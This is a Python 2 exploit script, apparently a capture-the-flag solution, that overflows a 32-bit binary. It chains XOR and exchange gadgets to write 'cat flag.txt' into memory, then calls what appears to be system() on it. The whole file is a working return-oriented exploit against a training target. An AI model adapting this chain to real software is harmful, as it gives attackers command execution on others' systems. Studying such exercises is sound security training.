import struct 

def p32(val): 
  return struct.pack('<L', val) 

def write4(val, loc): 
    rop = setecx(loc) 
    rop += setedx(val) 
    rop += p32(0x08048693) #mov dword ptr [ecx], edx; pop ebp; pop ebx; xor byte ptr [ecx], bl; ret; 
    rop += p32(0xffffffff) 
    rop += p32(0x00000000) #bl is ebx lower bytes, setting to 0 means we can easily compensate for xor 
    return rop 

def setecx(val): 
    value = 0xdefaced0 ^ val 
    rop = p32(0x804868c) #mov edx,0xdefaced0; ret 
    rop += p32(0x080483e1) #pop ebx; ret 
    rop += p32(value)  
    rop += p32(0x0804867b)# xor edx, ebx; pop ebp; mov edi, 0xdeadbabe; ret; 
    rop += p32(0xffffffff) 
    rop += p32(0x08048689) # xchg edx, ecx; pop ebp; mov edx, 0xdefaced0; ret; 
    rop += p32(0xffffffff) 
    return rop 

def setedx(val): 
    value = 0xdefaced0 ^ val 
    rop = p32(0x804868c)  #mov edx,0xdefaced0; ret 
    rop += p32(0x080483e1) #pop ebx; ret 
    rop += p32(value) #value to xor with edx 
    rop += p32(0x0804867b) #xor edx, ebx; pop ebp; mov edi, 0xdeadbabe; ret; 
    rop += p32(0xffffffff) 
    return rop 

def write(string, start): 
    buf = '' 
    chunks = [string[i:i+4] for i in range(0, len(string), 4)] 
    for x in range(len(chunks)): 
        address = start+x*4 
        buf += write4(struct.unpack('<L',chunks[x])[0], address) 
    return buf 

buf = 'A'*44 
buf += write('cat flag.txt', 0x0804a040) 
buf += p32(0x08048430) 
buf += p32(0) 
buf += p32(0x0804a040) 

print buf 
